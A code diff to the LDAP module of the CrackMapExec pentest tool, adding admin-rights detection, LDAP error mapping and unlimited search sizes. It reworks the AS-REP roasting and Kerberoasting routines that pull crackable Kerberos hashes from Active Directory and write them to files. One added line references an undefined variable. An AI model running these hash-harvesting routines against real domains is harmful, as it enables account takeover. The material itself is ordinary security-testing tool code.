@@ -4,6 +4,7 @@
 import requests
 import logging
 import configparser
+from binascii import b2a_hex, unhexlify, hexlify
 from cme.connection import *
 from cme.helpers.logger import highlight
 from cme.logger import CMEAdapter
@@ -17,6 +18,17 @@ from impacket.ldap import ldap as ldap_impacket
 from impacket.krb5 import constants
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
 from io import StringIO
+
+ldap_error_status = {
+    "533":"STATUS_ACCOUNT_DISABLED",
+    "701":"STATUS_ACCOUNT_EXPIRED",
+    "531":"STATUS_ACCOUNT_RESTRICTION",
+    "530":"STATUS_INVALID_LOGON_HOURS",
+    "532":"STATUS_PASSWORD_EXPIRED",
+    "773":"STATUS_PASSWORD_MUST_CHANGE",
+    "775":"USER_ACCOUNT_LOCKED",
+    "50":"LDAP_INSUFFICIENT_ACCESS"
+}
 
 class ldap(connection):
 
@@ -58,7 +70,7 @@ class ldap(connection):
         vgroup.add_argument("--trusted-for-delegation", action="store_true", help="Get the list of users and computers with flag TRUSTED_FOR_DELEGATION")
         vgroup.add_argument("--password-not-required", action="store_true", help="Get the list of users with flag PASSWD_NOTREQD")
         vgroup.add_argument("--admin-count", action="store_true", help="Get objets that had the value adminCount=1")
-        vgroup.add_argument("--users", action="store_true", help="Enumerate domain users")
+        vgroup.add_argument("--users", action="store_true", help="Enumerate enabled domain users")
         vgroup.add_argument("--groups", action="store_true", help="Enumerate domain groups")
 
         return parser
@@ -142,18 +154,19 @@ class ldap(connection):
                                                                                       self.smbv1))
 
     def kerberos_login(self, aesKey, kdcHost):
-        # Create the baseDN
-        domainParts = self.domain.split('.')
-        self.baseDN = ''
-        for i in domainParts:
-            self.baseDN += 'dc=%s,' % i
-        # Remove last ','
-        self.baseDN = self.baseDN[:-1]
-
         if self.kdcHost is not None:
             target = self.kdcHost
         else:
             target = self.domain
+            self.kdcHost = domain
+
+        # Create the baseDN
+        self.baseDN = ''
+        domainParts = self.kdcHost.split('.')
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
 
         try:
             self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
@@ -164,6 +177,13 @@ class ldap(connection):
                 self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                 self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                 self.aesKey, kdcHost=self.kdcHost)
+            else:
+                errorCode = str(e).split()[-2][:-1]
+                self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
+                                                 self.username, 
+                                                 self.password,
+                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
+                                                 color='magenta' if errorCode in ldap_error_status else 'red')
 
         return True
 
@@ -172,18 +192,20 @@ class ldap(connection):
         self.username = username
         self.password = password
         self.domain = domain
-        # Create the baseDN
-        self.baseDN = ''
-        domainParts = self.domain.split('.')
-        for i in domainParts:
-            self.baseDN += 'dc=%s,' % i
-        # Remove last ','
-        self.baseDN = self.baseDN[:-1]
 
         if self.kdcHost is not None:
             target = self.kdcHost
         else:
             target = domain
+            self.kdcHost = domain
+
+        # Create the baseDN
+        self.baseDN = ''
+        domainParts = self.kdcHost.split('.')
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
 
         if self.password == '' and self.args.asreproast:
             hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
@@ -196,7 +218,7 @@ class ldap(connection):
         try:
             self.ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
             self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
-            #self.check_if_admin()
+            self.check_if_admin()
 
             # Connect to LDAP
             out = u'{}{}:{} {}'.format('{}\\'.format(domain),
@@ -216,20 +238,26 @@ class ldap(connection):
                     self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                     self.logger.success(out)
                 except ldap_impacket.LDAPSessionError as e:
-                    self.logger.error(u'{}\{}:{}'.format(self.domain, 
-                                                            self.username, 
-                                                            self.password))
+                    errorCode = str(e).split()[-2][:-1]
+                    self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
+                                                    self.username, 
+                                                    self.password,
+                                                    ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
+                                                    color='magenta' if errorCode in ldap_error_status else 'red')
             else:
-                self.logger.error(u'{}\{}:{}'.format(self.domain, 
+                errorCode = str(e).split()[-2][:-1]
+                self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
-                                                 self.password))
+                                                 self.password,
+                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
+                                                 color='magenta' if errorCode in ldap_error_status else 'red')
             return False
 
         except OSError as e:
-            self.logger.error(u'{}\{}:{} {}'.format(self.domain, 
+            self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
                                                  self.password,
-                                                 "Error connecting to the domain, please add option --kdcHost with the IP of the domain controller"))
+                                                 "Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller"))
             return False
 
 
@@ -249,18 +277,20 @@ class ldap(connection):
 
         self.username = username
         self.domain = domain
-        # Create the baseDN
-        self.baseDN = ''
-        domainParts = self.domain.split('.')
-        for i in domainParts:
-            self.baseDN += 'dc=%s,' % i
-        # Remove last ','
-        self.baseDN = self.baseDN[:-1]
 
         if self.kdcHost is not None:
             target = self.kdcHost
         else:
             target = domain
+            self.kdcHost = domain
+
+        # Create the baseDN
+        self.baseDN = ''
+        domainParts = self.kdcHost.split('.')
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
 
         if self.hash == '' and self.args.asreproast:
             hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
@@ -277,7 +307,7 @@ class ldap(connection):
         try:
             self.ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
             self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
-            #self.check_if_admin()
+            self.check_if_admin()
             self.logger.success(out)
 
             if not self.args.continue_on_success:
@@ -290,19 +320,25 @@ class ldap(connection):
                     self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                     self.logger.success(out)
                 except ldap_impacket.LDAPSessionError as e:
-                    self.logger.error(u'{}\{}:{}'.format(self.domain, 
+                    errorCode = str(e).split()[-2][:-1]
+                    self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                     self.username, 
-                                                    self.nthash))
+                                                    self.password,
+                                                    ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
+                                                    color='magenta' if errorCode in ldap_error_status else 'red')
             else:
-                self.logger.error(u'{}\{}:{}'.format(self.domain, 
-                                                    self.username, 
-                                                    self.nthash))
+                errorCode = str(e).split()[-2][:-1]
+                self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
+                                                 self.username, 
+                                                 self.password,
+                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
+                                                 color='magenta' if errorCode in ldap_error_status else 'red')
             return False
         except OSError as e:
-            self.logger.error(u'{}\{}:{} {}'.format(self.domain, 
+            self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
                                                  self.nthash,
-                                                 "Error connecting to the domain, please add option --kdcHost with the IP of the domain controller"))
+                                                 "Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller"))
             return False
 
     def create_smbv1_conn(self):
@@ -339,12 +375,71 @@ class ldap(connection):
 
         return False
 
+    def sid_to_str(self, sid):
+
+        try:
+            # revision
+            revision = int(sid[0])
+            # count of sub authorities
+            sub_authorities = int(sid[1])
+            # big endian
+            identifier_authority = int.from_bytes(sid[2:8], byteorder='big')
+            # If true then it is represented in hex
+            if identifier_authority >= 2 ** 32:
+                identifier_authority = hex(identifier_authority)
+
+            # loop over the count of small endians
+            sub_authority = '-' + '-'.join([str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder='little')) for i in range(sub_authorities)])
+            objectSid = 'S-' + str(revision) + '-' + str(identifier_authority) + sub_authority
+
+            return objectSid
+        except Exception:
+            pass
+
+        return sid
+
+    def check_if_admin(self):
+
+        # 1. get SID of the domaine
+        sid_domaine = ""
+        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
+        attributes= ["objectSid"]
+        resp = self.search(searchFilter, attributes,  sizeLimit=0)
+        answers = []
+        for attribute in resp[0][1]:
+            if str(attribute['type']) == 'objectSid':
+                sid = self.sid_to_str(attribute['vals'][0])
+                sid_domaine = '-'.join(sid.split('-')[:-1])
+
+        # 2. get all group cn name
+        searchFilter = "(|(objectSid="+sid_domaine+"-512)(objectSid="+sid_domaine+"-544)(objectSid="+sid_domaine+"-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
+        attributes= ["distinguishedName"]
+        resp = self.search(searchFilter, attributes,  sizeLimit=0)
+        answers = []
+        for item in resp:
+            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                continue
+            for attribute in item['attributes']:
+                if str(attribute['type']) == 'distinguishedName':
+                    answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + attribute['vals'][0] + ")"))
+
+        # 3. get memeber of these groups
+        searchFilter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + ''.join(answers) + "))"
+        attributes= [""]
+        resp = self.search(searchFilter, attributes,  sizeLimit=0)
+        answers = []
+        for item in resp:
+            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                continue
+            if item:
+                self.admin_privs = True
+
     def getUnixTime(self, t):
         t -= 116444736000000000
         t /= 10000000
         return t
 
-    def search(self, searchFilter, attributes, sizeLimit=999):
+    def search(self, searchFilter, attributes, sizeLimit=0):
         try:
             logging.debug('Search Filter=%s' % searchFilter)
             resp = self.ldapConnection.search(searchFilter=searchFilter,
@@ -352,13 +447,13 @@ class ldap(connection):
                                                 sizeLimit=sizeLimit)
         except ldap_impacket.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
-                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
+                self.logger.error('sizeLimitExceeded exception caught, giving up and processing the data received')
                 # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                 # paged queries
                 resp = e.getAnswers()
                 pass
             else:
-                logging.debug(e)
+                self.logger.error(e)
                 return False
         return resp 
 
@@ -366,76 +461,74 @@ class ldap(connection):
         # Building the search filter
         searchFilter = "(sAMAccountType=805306368)"
         attributes= []
-        resp = self.search(searchFilter, attributes, 999)
-        answers = []
-        logging.debug('Total of records returned %d' % len(resp))
+        resp = self.search(searchFilter, attributes,  sizeLimit=0)
+        if resp:
+            answers = []
+            self.logger.info('Total of records returned %d' % len(resp))
 
-        for item in resp:
-            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
-                continue
-            mustCommit = False
-            sAMAccountName =  ''
-            badPasswordTime = ''
-            badPwdCount = 0
-            try:
-                for attribute in item['attributes']:
-                    if str(attribute['type']) == 'sAMAccountName':
-                        sAMAccountName = str(attribute['vals'][0])
-                        mustCommit = True
-                    elif str(attribute['type']) == 'badPwdCount':
-                        badPwdCount = "0x%x" % int(attribute['vals'][0])
-                    elif str(attribute['type']) == 'badPasswordTime':
-                        if str(attribute['vals'][0]) == '0':
-                            badPasswordTime = '<never>'
-                        else:
-                            badPasswordTime = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                if mustCommit is True:
-                    answers.append([sAMAccountName, badPwdCount, badPasswordTime])
-            except Exception as e:
-                logging.debug("Exception:", exc_info=True)
-                logging.debug('Skipping item, cannot process due to error %s' % str(e))
-                pass
-        if len(answers)>0:
-            logging.debug(answers)
-            for value in answers:
-                self.logger.highlight('{:<30} badpwdcount: {} pwdLastSet: {}'.format(value[0], int(value[1],16),value[2]))
-        else:
-            self.logger.error("No entries found!")
-        return
+            for item in resp:
+                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                    continue
+                sAMAccountName =  ''
+                badPasswordTime = ''
+                badPwdCount = 0
+                try:
+                    for attribute in item['attributes']:
+                        if str(attribute['type']) == 'sAMAccountName':
+                            sAMAccountName = str(attribute['vals'][0])
+                        elif str(attribute['type']) == 'badPwdCount':
+                            badPwdCount = str(attribute['vals'][0])
+                        elif str(attribute['type']) == 'pwdLastSet':
+                            if str(attribute['vals'][0]) == '0':
+                                pwdLastSet = '<never>'
+                            else:
+                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                    answers.append([sAMAccountName, badPwdCount, pwdLastSet])
+                except Exception as e:
+                    self.logger.debug('Skipping item, cannot process due to error %s' % str(e))
+                    pass
+            if len(answers)>0:
+                logging.debug(answers)
+                for value in answers:
+                    self.logger.highlight('{:<30} badpwdcount: {} pwdLastSet: {}'.format(value[0], value[1],value[2]))
+            else:
+                self.logger.error("No entries found!")
+            return
 
     def groups(self):
         # Building the search filter
         searchFilter = "(objectCategory=group)"
         attributes=[]
-        resp = self.search(searchFilter, attributes, 999)
-        answers = []
-        logging.debug('Total of records returned %d' % len(resp))
+        resp = self.search(searchFilter, attributes, 0)
+        if resp:
+            answers = []
+            logging.debug('Total of records returned %d' % len(resp))
 
-        for item in resp:
-            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
-                continue
-            mustCommit = False
-            name =  ''
-            try:
-                for attribute in item['attributes']:
-                    if str(attribute['type']) == 'name':
-                        name = str(attribute['vals'][0])
-                        mustCommit = True
-                    # if str(attribute['type']) == 'objectSid':
-                    #     print(format_sid((attribute['vals'][0])))
-                if mustCommit is True:
-                    answers.append([name])
-            except Exception as e:
-                logging.debug("Exception:", exc_info=True)
-                logging.debug('Skipping item, cannot process due to error %s' % str(e))
-                pass
-        if len(answers)>0:
-            logging.debug(answers)
-            for value in answers:
-                self.logger.highlight('{}'.format(value[0]))
-        else:
-            self.logger.error("No entries found!")
-        return       
+            for item in resp:
+                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                    continue
+                mustCommit = False
+                name =  ''
+                try:
+                    for attribute in item['attributes']:
+                        if str(attribute['type']) == 'name':
+                            name = str(attribute['vals'][0])
+                            mustCommit = True
+                        # if str(attribute['type']) == 'objectSid':
+                        #     print(format_sid((attribute['vals'][0])))
+                    if mustCommit is True:
+                        answers.append([name])
+                except Exception as e:
+                    logging.debug("Exception:", exc_info=True)
+                    logging.debug('Skipping item, cannot process due to error %s' % str(e))
+                    pass
+            if len(answers)>0:
+                logging.debug(answers)
+                for value in answers:
+                    self.logger.highlight('{}'.format(value[0]))
+            else:
+                self.logger.error("No entries found!")
+            return       
 
     def asreproast(self):
         if self.password == '' and self.nthash == '' and self.kerberos == False:
@@ -445,139 +538,143 @@ class ldap(connection):
                     "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                     (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
         attributes = ['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
-        resp = self.search(searchFilter, attributes, 999)
+        resp = self.search(searchFilter, attributes, 0)
+        if resp:
+            answers = []
+            self.logger.info('Total of records returned %d' % len(resp))
 
-        answers = []
-        logging.debug('Total of records returned %d' % len(resp))
-
-        for item in resp:
-            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
-                continue
-            mustCommit = False
-            sAMAccountName =  ''
-            memberOf = ''
-            pwdLastSet = ''
-            userAccountControl = 0
-            lastLogon = 'N/A'
-            try:
-                for attribute in item['attributes']:
-                    if str(attribute['type']) == 'sAMAccountName':
-                        sAMAccountName = str(attribute['vals'][0])
-                        mustCommit = True
-                    elif str(attribute['type']) == 'userAccountControl':
-                        userAccountControl = "0x%x" % int(attribute['vals'][0])
-                    elif str(attribute['type']) == 'memberOf':
-                        memberOf = str(attribute['vals'][0])
-                    elif str(attribute['type']) == 'pwdLastSet':
-                        if str(attribute['vals'][0]) == '0':
-                            pwdLastSet = '<never>'
-                        else:
-                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                    elif str(attribute['type']) == 'lastLogon':
-                        if str(attribute['vals'][0]) == '0':
-                            lastLogon = '<never>'
-                        else:
-                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                if mustCommit is True:
-                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
-            except Exception as e:
-                logging.debug("Exception:", exc_info=True)
-                logging.debug('Skipping item, cannot process due to error %s' % str(e))
-                pass
-        if len(answers)>0:
-            for user in answers:
-                hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
-                self.logger.highlight(u'{}'.format(hash_TGT))
-                with open(self.args.asreproast, 'a+') as hash_asreproast:
-                    hash_asreproast.write(hash_TGT + '\n')
-            return True
-        else:
-            self.logger.error("No entries found!")
+            for item in resp:
+                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                    continue
+                mustCommit = False
+                sAMAccountName =  ''
+                memberOf = ''
+                pwdLastSet = ''
+                userAccountControl = 0
+                lastLogon = 'N/A'
+                try:
+                    for attribute in item['attributes']:
+                        if str(attribute['type']) == 'sAMAccountName':
+                            sAMAccountName = str(attribute['vals'][0])
+                            mustCommit = True
+                        elif str(attribute['type']) == 'userAccountControl':
+                            userAccountControl = "0x%x" % int(attribute['vals'][0])
+                        elif str(attribute['type']) == 'memberOf':
+                            memberOf = str(attribute['vals'][0])
+                        elif str(attribute['type']) == 'pwdLastSet':
+                            if str(attribute['vals'][0]) == '0':
+                                pwdLastSet = '<never>'
+                            else:
+                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                        elif str(attribute['type']) == 'lastLogon':
+                            if str(attribute['vals'][0]) == '0':
+                                lastLogon = '<never>'
+                            else:
+                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                    if mustCommit is True:
+                        answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
+                except Exception as e:
+                    logging.debug("Exception:", exc_info=True)
+                    logging.debug('Skipping item, cannot process due to error %s' % str(e))
+                    pass
+            if len(answers)>0:
+                for user in answers:
+                    hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
+                    self.logger.highlight(u'{}'.format(hash_TGT))
+                    with open(self.args.asreproast, 'a+') as hash_asreproast:
+                        hash_asreproast.write(hash_TGT + '\n')
+                return True
+            else:
+                self.logger.highlight("No entries found!")
+                return
+        self.logger.error("Error with the LDAP account used")
 
     def kerberoasting(self):
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                        "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
         attributes = ['servicePrincipalName', 'sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
-        resp = self.search(searchFilter, attributes, 999)
+        resp = self.search(searchFilter, attributes, 0)
+        if resp:
+            answers = []
+            self.logger.info('Total of records returned %d' % len(resp))
 
-        answers = []
-        logging.debug('Total of records returned %d' % len(resp))
-
-        for item in resp:
-            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
-                continue
-            mustCommit = False
-            sAMAccountName =  ''
-            memberOf = ''
-            SPNs = []
-            pwdLastSet = ''
-            userAccountControl = 0
-            lastLogon = 'N/A'
-            delegation = ''
-            try:
-                for attribute in item['attributes']:
-                    if str(attribute['type']) == 'sAMAccountName':
-                        sAMAccountName = str(attribute['vals'][0])
-                        mustCommit = True
-                    elif str(attribute['type']) == 'userAccountControl':
-                        userAccountControl = str(attribute['vals'][0])
-                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
-                            delegation = 'unconstrained'
-                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
-                            delegation = 'constrained'
-                    elif str(attribute['type']) == 'memberOf':
-                        memberOf = str(attribute['vals'][0])
-                    elif str(attribute['type']) == 'pwdLastSet':
-                        if str(attribute['vals'][0]) == '0':
-                            pwdLastSet = '<never>'
-                        else:
-                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                    elif str(attribute['type']) == 'lastLogon':
-                        if str(attribute['vals'][0]) == '0':
-                            lastLogon = '<never>'
-                        else:
-                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                    elif str(attribute['type']) == 'servicePrincipalName':
-                        for spn in attribute['vals']:
-                            SPNs.append(str(spn))
-
-                if mustCommit is True:
-                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
-                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
-                    else:
-                        for spn in SPNs:
-                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon, delegation])
-            except Exception as e:
-                logging.error('Skipping item, cannot process due to error %s' % str(e))
-                pass
-
-        if len(answers)>0:
-            #users = dict( (vals[1], vals[0]) for vals in answers)
-            TGT = KerberosAttacks(self).getTGT_kerberoasting()
-            for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
+            for item in resp:
+                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                    continue
+                mustCommit = False
+                sAMAccountName =  ''
+                memberOf = ''
+                SPNs = []
+                pwdLastSet = ''
+                userAccountControl = 0
+                lastLogon = 'N/A'
+                delegation = ''
                 try:
-                    serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
-                                                                            self.kdcHost,
-                                                                            TGT['KDC_REP'], TGT['cipher'],
-                                                                            TGT['sessionKey'])
-                    r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
-                    self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
-                    self.logger.highlight(u'{}'.format(r))
-                    with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
-                        hash_kerberoasting.write(r + '\n')
+                    for attribute in item['attributes']:
+                        if str(attribute['type']) == 'sAMAccountName':
+                            sAMAccountName = str(attribute['vals'][0])
+                            mustCommit = True
+                        elif str(attribute['type']) == 'userAccountControl':
+                            userAccountControl = str(attribute['vals'][0])
+                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
+                                delegation = 'unconstrained'
+                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
+                                delegation = 'constrained'
+                        elif str(attribute['type']) == 'memberOf':
+                            memberOf = str(attribute['vals'][0])
+                        elif str(attribute['type']) == 'pwdLastSet':
+                            if str(attribute['vals'][0]) == '0':
+                                pwdLastSet = '<never>'
+                            else:
+                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                        elif str(attribute['type']) == 'lastLogon':
+                            if str(attribute['vals'][0]) == '0':
+                                lastLogon = '<never>'
+                            else:
+                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                        elif str(attribute['type']) == 'servicePrincipalName':
+                            for spn in attribute['vals']:
+                                SPNs.append(str(spn))
+
+                    if mustCommit is True:
+                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
+                            logging.debug('Bypassing disabled account %s ' % sAMAccountName)
+                        else:
+                            for spn in SPNs:
+                                answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon, delegation])
                 except Exception as e:
-                    logging.debug("Exception:", exc_info=True)
-                    logging.error('SPN: %s - %s' % (SPN,str(e)))
-        else:
-            self.logger.error("No entries found!")
+                    logging.error('Skipping item, cannot process due to error %s' % str(e))
+                    pass
+
+            if len(answers)>0:
+                #users = dict( (vals[1], vals[0]) for vals in answers)
+                TGT = KerberosAttacks(self).getTGT_kerberoasting()
+                for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
+                    try:
+                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
+                                                                                self.kdcHost,
+                                                                                TGT['KDC_REP'], TGT['cipher'],
+                                                                                TGT['sessionKey'])
+                        r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
+                        self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
+                        self.logger.highlight(u'{}'.format(r))
+                        with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
+                            hash_kerberoasting.write(r + '\n')
+                    except Exception as e:
+                        logging.debug("Exception:", exc_info=True)
+                        logging.error('SPN: %s - %s' % (SPN,str(e)))
+            else:
+                self.logger.highlight("No entries found!")
+                return
+        self.logger.error("Error with the LDAP account used")
 
     def trusted_for_delegation(self):
         # Building the search filter
         searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
         attributes = ['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
-        resp = self.search(searchFilter, attributes, 999)
+        resp = self.search(searchFilter, attributes, 0)
 
         answers = []
         logging.debug('Total of records returned %d' % len(resp))
@@ -632,7 +729,7 @@ class ldap(connection):
             resp = self.ldapConnection.search(searchFilter=searchFilter,
                         attributes=['sAMAccountName',
                                 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
-                        sizeLimit=999)
+                        sizeLimit=0)
         except ldap_impacket.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
@@ -694,7 +791,7 @@ class ldap(connection):
         # Building the search filter
         searchFilter = "(adminCount=1)"
         attributes=['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
-        resp = self.search(searchFilter, attributes, 999)
+        resp = self.search(searchFilter, attributes, 0)
         answers = []
         logging.debug('Total of records returned %d' % len(resp))
 
